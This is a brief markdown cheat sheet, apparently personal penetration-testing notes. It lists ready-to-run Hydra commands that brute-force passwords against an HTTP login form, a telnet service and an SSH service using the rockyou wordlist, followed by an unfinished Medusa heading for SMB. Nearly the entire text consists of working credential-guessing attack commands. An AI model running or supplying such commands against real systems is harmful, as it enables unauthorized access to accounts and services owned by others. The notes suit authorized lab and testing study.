#### Hydra

```
#This will brute force an HTTP login post form.
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

#This will brute force telnet.
hydra -L userlist.txt -P passlist.txt telnet://target

#This will brute force ssh
hydra -L /usr/share/ncrack/minimal.usr -P rockyou-15.txt 192.168.99.22 ssh
```

#### Medusa
addd command to brute force smb?